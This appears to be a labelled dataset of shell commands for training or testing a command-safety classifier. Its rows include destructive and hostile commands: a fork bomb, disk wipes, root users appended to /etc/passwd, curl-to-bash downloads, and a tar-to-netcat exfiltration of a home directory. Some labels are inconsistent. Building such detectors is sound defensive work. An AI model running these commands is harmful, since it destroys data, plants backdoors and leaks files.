command,label,source
echo 'working' && ls,safe,synthetic
rm -rf dist,risky,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
wipefs -a /dev/sda,destructive,mitre-attack
cat -v,safe,synthetic
sudo pip,safe,synthetic
mkfs.ext4 /dev/sda,destructive,synthetic
free -h,safe,bash-history
bomb() { bomb | bomb & }; bomb,destructive,mitre-attack
echo 'working' && cp,safe,synthetic
chmod -R 766 /opt/app,risky,synthetic
chattr -i /etc/passwd,risky,mitre-attack
crontab -e,risky,mitre-attack
sudo pip,safe,synthetic
rm -rf /*,destructive,synthetic
cat -v,safe,synthetic
echo 'working' && mv,safe,synthetic
systemctl disable ufw,risky,mitre-attack
rm -rf dist,risky,synthetic
echo 'working' && docker,safe,synthetic
head | grep -i fail,safe,synthetic
systemctl -v,safe,synthetic
apt | grep -i fail,safe,synthetic
mv ..,safe,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
head /tmp,safe,synthetic
dd if=/dev/urandom of=/dev/sdb bs=1M,destructive,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
echo 'aGVsbG8=' | base64 -d,risky,mitre-attack
sudo ls,safe,synthetic
mkfs.ext4 /dev/sdb1,destructive,synthetic
mkfs.vfat /dev/sdb1,destructive,synthetic
shred -u /dev/mmcblk0,destructive,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
chmod -R 777 /tmp/data,risky,synthetic
pip --help,safe,synthetic
df -i,safe,bash-history
tar czf - /home/user | nc 10.0.0.5 4444,risky,mitre-attack
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
sudo head,safe,synthetic
sudo grep,safe,synthetic
find /home/user -type f -name '*.log',safe,bash-history
cp config.example.yml config.yml,safe,bash-history
sudo pip,safe,synthetic
dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive,synthetic
rm -rf /boot,destructive,synthetic
sudo shred,destructive,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
ls .,safe,synthetic
